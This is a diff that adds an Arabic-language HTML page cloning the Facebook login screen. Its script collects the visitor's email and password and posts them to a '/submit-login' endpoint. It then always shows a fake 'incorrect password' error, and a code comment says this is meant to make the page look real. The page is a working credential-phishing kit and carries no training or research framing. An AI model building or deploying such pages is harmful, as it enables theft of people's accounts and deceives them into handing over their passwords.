@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Facebook - تسجيل الدخول</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Cairo', sans-serif; }
+        
+        body {
+            background: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            background: white;
+            max-width: 400px;
+            width: 100%;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+            padding: 30px 24px;
+            text-align: center;
+        }
+        
+        .logo {
+            font-size: 42px;
+            font-weight: 800;
+            color: #1877f2;
+            margin-bottom: 8px;
+        }
+        
+        .tagline {
+            color: #606770;
+            font-size: 15px;
+            margin-bottom: 28px;
+        }
+        
+        .input-group {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #dddfe2;
+            border-radius: 8px;
+            font-size: 16px;
+            margin-bottom: 12px;
+            outline: none;
+            transition: 0.2s;
+            background: #fff;
+        }
+        
+        .input-group:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 3px rgba(24, 119, 242, 0.15);
+        }
+        
+        .input-group::placeholder {
+            color: #90949c;
+        }
+        
+        .login-btn {
+            width: 100%;
+            padding: 14px;
+            background: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.2s;
+            margin-top: 6px;
+        }
+        
+        .login-btn:hover { background: #166fe5; }
+        .login-btn:active { transform: scale(0.98); }
+        .login-btn:disabled { opacity: 0.6; cursor: not-allowed; }
+        
+        .forgot-link {
+            display: block;
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+            margin: 16px 0 20px;
+        }
+        
+        .forgot-link:hover { text-decoration: underline; }
+        
+        .divider {
+            border-top: 1px solid #dadde1;
+            margin: 20px 0;
+        }
+        
+        .create-btn {
+            display: inline-block;
+            padding: 14px 30px;
+            background: #42b72a;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            text-decoration: none;
+            transition: 0.2s;
+        }
+        
+        .create-btn:hover { background: #36a420; }
+        
+        .footer {
+            text-align: center;
+            margin-top: 24px;
+            font-size: 13px;
+            color: #90949c;
+        }
+        
+        .footer strong { color: #1a1a1a; }
+        
+        .error-msg {
+            background: #ffebe8;
+            color: #d32f2f;
+            padding: 10px 14px;
+            border-radius: 8px;
+            font-size: 14px;
+            margin-bottom: 12px;
+            display: none;
+        }
+        
+        .error-msg.show { display: block; }
+        
+        .loading-spinner {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-top: 3px solid white;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .login-btn.loading .btn-text { display: none; }
+        .login-btn.loading .loading-spinner { display: block; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        
+        <!-- الشعار -->
+        <div class="logo">facebook</div>
+        <div class="tagline">تسجيل الدخول إلى حسابك</div>
+        
+        <!-- رسالة خطأ -->
+        <div id="errorMsg" class="error-msg">
+            ⚠️ البريد الإلكتروني أو كلمة المرور غير صحيحة
+        </div>
+        
+        <!-- نموذج تسجيل الدخول -->
+        <form id="loginForm">
+            <input 
+                type="text" 
+                id="email" 
+                name="email" 
+                class="input-group" 
+                placeholder="البريد الإلكتروني أو رقم الهاتف"
+                required
+                autocomplete="username">
+            
+            <input 
+                type="password" 
+                id="password" 
+                name="password" 
+                class="input-group" 
+                placeholder="كلمة المرور"
+                required
+                autocomplete="current-password">
+            
+            <button type="submit" id="loginBtn" class="login-btn">
+                <span class="btn-text">تسجيل الدخول</span>
+                <div class="loading-spinner"></div>
+            </button>
+        </form>
+        
+        <a href="#" class="forgot-link">هل نسيت كلمة المرور؟</a>
+        
+        <div class="divider"></div>
+        
+        <a href="#" class="create-btn">إنشاء حساب جديد</a>
+        
+        <div class="footer">
+            <strong>English (US)</strong> · العربية · Français
+        </div>
+    </div>
+
+    <script>
+        const form = document.getElementById('loginForm');
+        const loginBtn = document.getElementById('loginBtn');
+        const errorMsg = document.getElementById('errorMsg');
+        const emailInput = document.getElementById('email');
+        const passwordInput = document.getElementById('password');
+
+        form.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const email = emailInput.value.trim();
+            const password = passwordInput.value.trim();
+            
+            // التحقق من المدخلات
+            if (!email || !password) {
+                errorMsg.textContent = '⚠️ يرجى ملء جميع الحقول';
+                errorMsg.classList.add('show');
+                return;
+            }
+            
+            if (password.length < 4) {
+                errorMsg.textContent = '⚠️ كلمة المرور قصيرة جداً';
+                errorMsg.classList.add('show');
+                return;
+            }
+            
+            errorMsg.classList.remove('show');
+            
+            // تشغيل حالة التحميل
+            loginBtn.classList.add('loading');
+            loginBtn.disabled = true;
+            
+            try {
+                const response = await fetch('/submit-login', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ email, password })
+                });
+                
+                const data = await response.json();
+                console.log('✅ تم الإرسال:', data);
+                
+                // بعد ثانيتين نعيد الزر لحالته
+                setTimeout(() => {
+                    loginBtn.classList.remove('loading');
+                    loginBtn.disabled = false;
+                    
+                    // إظهار رسالة خطأ عشان يبان حقيقي
+                    errorMsg.textContent = '⚠️ البريد الإلكتروني أو كلمة المرور غير صحيحة';
+                    errorMsg.classList.add('show');
+                    
+                    // مسح كلمة المرور
+                    passwordInput.value = '';
+                    passwordInput.focus();
+                }, 2000);
+                
+            } catch (error) {
+                console.error('❌ خطأ:', error);
+                loginBtn.classList.remove('loading');
+                loginBtn.disabled = false;
+                errorMsg.textContent = '⚠️ حدث خطأ في الاتصال';
+                errorMsg.classList.add('show');
+            }
+        });
+    </script>
+
+</body>
+</html>
